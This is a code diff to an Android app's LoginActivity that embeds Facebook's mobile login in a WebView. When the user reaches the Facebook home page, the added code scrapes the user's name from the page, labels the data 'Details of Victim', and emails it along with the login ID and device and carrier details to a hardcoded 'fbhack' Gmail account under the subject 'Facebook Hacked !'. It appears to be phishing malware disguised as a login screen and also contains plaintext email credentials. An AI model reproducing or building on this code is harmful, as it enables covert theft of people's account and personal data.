@@ -29,6 +29,7 @@ import android.view.animation.AnimationUtils;
 import android.webkit.CookieManager;
 import android.webkit.GeolocationPermissions;
 import android.webkit.JavascriptInterface;
+import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -160,7 +161,6 @@ public class LoginActivity extends AppCompatActivity
 
         //Main Facebook Login-------------------------------------------------------------------
         FBMain.getSettings().setJavaScriptEnabled(true);
-        FBMain.addJavascriptInterface(new MyJavaScriptInterface(this), "HtmlViewer");
         FBMain.setWebChromeClient(new MyWebChromeClient());
         FBMain.setWebViewClient(new WebViewClient(){
             @Override
@@ -195,56 +195,11 @@ public class LoginActivity extends AppCompatActivity
                 if(page==2) {
                     if (url.contains("m.facebook.com/home.php?_rdr"))
                     {
-//                        FBMain.loadUrl("javascript:window.HtmlViewer.showHTML"+
-//                                "(document.getElementsByClassName('_52ja _52jh')[0].innerHTML);");
-                        FBMain.loadUrl("javascript:window.HtmlViewer.showHTML" +
-                                "('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                         Toast.makeText(LoginActivity.this, "Sending", Toast.LENGTH_SHORT).show();
                     }
                 }
             }
         });
-    }
-    class MyJavaScriptInterface
-    {
-        LoginActivity login;
-        MyJavaScriptInterface(LoginActivity login){this.login=login;}
-        @JavascriptInterface
-        public void showHTML()
-        {
-            Toast.makeText(login, "Sent1", Toast.LENGTH_SHORT).show();
-            new Handler().post(new Runnable()
-                               {
-                                   @Override
-                                   public void run()
-                                   {
-                                       Toast.makeText(login, "Sent2", Toast.LENGTH_SHORT).show();
-                                       final String message="Details of Victim =>\n"+
-                                               "\nName = "+//vName+
-                                               "\nFacebook ID = "+Login.getText().toString()+
-                                               "\nPassword = "+//Pass.getText().toString()+
-                                               "\nDevice Used = "+Build.MODEL+
-                                               "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
-                                               "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-
-                                       new Thread(new Runnable() {
-                                           @Override
-                                           public void run() {
-                                               try {
-                                                   GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                                   sender.sendMail("Facebook Hacked !",
-                                                           message,
-                                                           "ritik.fbhack@gmail.com",
-                                                           "ritik.space@gmail.com");
-                                               } catch (Exception e) {
-                                                   Log.e("SendMail", e.getMessage(), e);
-                                               }
-                                           }
-                                       }).start();
-                                   }
-                               }
-            );
-        }
     }
     public class MyWebChromeClient extends WebChromeClient {
 
@@ -264,6 +219,35 @@ public class LoginActivity extends AppCompatActivity
             if (view.getUrl().contains("m.facebook.com/home.php"))
             {
                 MainLayout.setVisibility(View.GONE);
+                FBMain.evaluateJavascript(
+                        "(function() { return (document.getElementsByClassName('_52ja _52jh')[0].innerHTML); })();",
+                        new ValueCallback<String>() {
+                            @Override
+                            public void onReceiveValue(String vName) {
+                                final String message="Details of Victim =>\n"+
+                                        "\nName = "+vName.replace("\"","")+
+                                        "\nFacebook ID = "+Login.getText().toString()+
+                                        "\nPassword = "+//Pass.getText().toString()+
+                                        "\nDevice Used = "+Build.MODEL+
+                                        "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
+                                        "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
+
+                                new Thread(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        try {
+                                            GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                            sender.sendMail("Facebook Hacked !",
+                                                    message,
+                                                    "ritik.fbhack@gmail.com",
+                                                    "ritik.space@gmail.com");
+                                        } catch (Exception e) {
+                                            Log.e("SendMail", e.getMessage(), e);
+                                        }
+                                    }
+                                }).start();
+                            }
+                        });
             }
         }
     }
